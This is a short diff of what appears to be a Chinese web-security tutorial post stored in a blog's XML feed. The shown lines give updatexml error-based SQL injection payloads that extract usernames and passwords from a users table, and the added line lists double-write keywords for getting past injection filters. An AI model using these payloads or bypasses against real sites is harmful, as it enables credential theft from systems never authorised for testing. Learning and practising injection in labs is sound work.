@@ -2240,6 +2240,7 @@ updatexml报错无需查询列数和回显位，只需要先确定闭合方式
 ?id=1&#39; and 1=updatexml(1,concat(0x7e,(select group_concat(username,password) from users)),3) --+
 查询最终目标
 ?id=1&#39; and 1=updatexml(1,concat(0x7e,(select substring(group_concat(username,&#39;:&#39;,password),1,30) from users)),3) --+
+双写绕过frfromom,ununionion,seselectlect,anandd,infoorrmation,ordorderer by,whwhereere,passwoorrd
 ]]></content>
       <categories>
         <category>web入门</category>
